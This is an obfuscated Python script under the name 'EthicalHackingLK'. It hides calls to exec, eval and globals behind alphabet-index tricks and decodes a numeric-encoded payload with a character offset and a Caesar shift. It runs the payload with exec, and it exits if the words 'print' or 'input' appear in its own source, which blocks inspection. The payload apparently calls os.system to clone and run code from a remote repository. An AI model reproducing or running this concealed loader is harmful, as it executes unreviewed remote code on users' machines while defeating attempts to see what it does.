class EthicalHackingLK():
 def __init__(self:object,_system:float=False,_encode:bool=0,*_decode:float,**_eval:bool)->exec:
  self._bits,_system,self._rasputin,self._boom,self._delete,_eval[_encode]=exit()if _system else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _system:exit()if self._bits[15]+self._bits[17]+self._bits[8]+self._bits[13]+self._bits[19] in open(__file__, errors=self._bits[8]+self._bits[6]+self._bits[13]+self._bits[14]+self._bits[17]+self._bits[4]).read() or self._bits[8]+self._bits[13]+self._bits[15]+self._bits[20]+self._bits[19] in open(__file__, errors=self._bits[8]+self._bits[6]+self._bits[13]+self._bits[14]+self._bits[17]+self._bits[4]).read()else"".join(_system if _system not in self._bits else self._bits[self._bits.index(_system)+1 if self._bits.index(_system)+1<len(self._bits)else 0]for _system in "".join(chr(ord(t)-332480)if t!="ζ"else"\n"for t in self._boom(_system))),lambda _system:str(_eval[_encode](f"{self._bits[4]+self._bits[-13]+self._bits[4]+self._bits[2]}(''.join(%s),{self._bits[6]+self._bits[11]+self._bits[14]+self._bits[1]+self._bits[0]+self._bits[11]+self._bits[18]}())"%list(_system))).encode(self._bits[20]+self._bits[19]+self._bits[5]+self._bits[34])if _eval[_encode]==eval else exit(),lambda _bytes:"".join(chr(int(_exec)-len(_bytes.split('=')))if _exec!='^'else'ζ'for _exec in str(_bytes).split('=')),lambda _byte:_system(_byte),eval
  return self.__decode__(_eval[(self._bits[-1]+'_')[-1]+self._bits[18]+self._bits[15]+self._bits[0]+self._bits[17]+self._bits[10]+self._bits[11]+self._bits[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._rasputin(self._delete(_execute)))[0]
EthicalHackingLK(_system=False,_sparkle='''332709=332713=332716=332715=332718=332720=332637=332715=332719=^=^=332715=332719=332651=332719=332725=332719=332720=332705=332713=332645=332639=332704=332705=332712=332637=332723=332709=332706=332709=332700=332708=332662=332703=332711=332651=332705=332724=332705=332639=332646=^=332715=332719=332651=332719=332725=332719=332720=332705=332713=332645=332639=332707=332709=332720=332637=332703=332712=332715=332714=332705=332637=332708=332720=332720=332716=332719=332663=332652=332652=332707=332709=332720=332708=332721=332702=332651=332703=332715=332713=332652=332674=332720=332708=332709=332703=332662=332712=332677=332662=332703=332711=332709=332714=332707=332681=332680=332652=332692=332678=332675=332678=332650=332677=332662=332703=332711=332652=332723=332709=332706=332709=332650=332708=332662=332703=332711=332651=332705=332724=332705=332639=332646=^''')